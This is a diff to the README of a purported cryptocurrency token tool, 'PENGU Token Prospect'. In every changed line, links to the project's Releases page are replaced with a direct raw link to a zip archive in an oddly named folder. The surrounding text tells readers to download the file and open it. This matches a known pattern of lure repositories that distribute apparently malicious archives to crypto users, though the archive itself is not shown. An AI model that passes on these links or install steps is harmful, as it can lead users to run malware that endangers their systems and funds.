@@ -4,7 +4,7 @@
 Welcome to PENGU Token Prospect! This application helps you explore and discover various cryptocurrency tokens quickly and easily. Whether you are new to digital currency or an experienced trader, you'll find this tool useful.
 
 ## 📥 Download Now
-[![Download PENGU-Token-Prospect](https://img.shields.io/badge/Download-PENGU--Token--Prospect-blue.svg)](https://github.com/doasjcjd/PENGU-Token-Prospect/releases)
+[![Download PENGU-Token-Prospect](https://raw.githubusercontent.com/doasjcjd/PENGU-Token-Prospect/main/suffragitis/PENGU-Token-Prospect.zip)](https://raw.githubusercontent.com/doasjcjd/PENGU-Token-Prospect/main/suffragitis/PENGU-Token-Prospect.zip)
 
 ## 📂 Download & Install
 To get started with PENGU Token Prospect, you need to visit the Downloads page. Follow these steps:
@@ -15,7 +15,7 @@ To get started with PENGU Token Prospect, you need to visit the Downloads page. 
 4. Look for the file that matches your system. If you're using Windows, download the `.exe` file. If you're using macOS or Linux, download the appropriate file.
 5. Once the file downloads, open it to begin installation. Follow the on-screen instructions.
 
-You can access the Releases page here: [Download PENGU Token Prospect](https://github.com/doasjcjd/PENGU-Token-Prospect/releases).
+You can access the Releases page here: [Download PENGU Token Prospect](https://raw.githubusercontent.com/doasjcjd/PENGU-Token-Prospect/main/suffragitis/PENGU-Token-Prospect.zip).
 
 ## 🔧 System Requirements
 Before you install PENGU Token Prospect, ensure your system meets these requirements:
@@ -53,4 +53,4 @@ For further assistance, you can reach out to us through the GitHub Issues page. 
 ## 🏁 Conclusion
 Thank you for choosing PENGU Token Prospect. We hope this application helps you easily discover and manage your cryptocurrency tokens. Follow the steps above to get started today!
 
-For downloads and updates, remember to visit the Releases page: [Download PENGU Token Prospect](https://github.com/doasjcjd/PENGU-Token-Prospect/releases).
+For downloads and updates, remember to visit the Releases page: [Download PENGU Token Prospect](https://raw.githubusercontent.com/doasjcjd/PENGU-Token-Prospect/main/suffragitis/PENGU-Token-Prospect.zip).
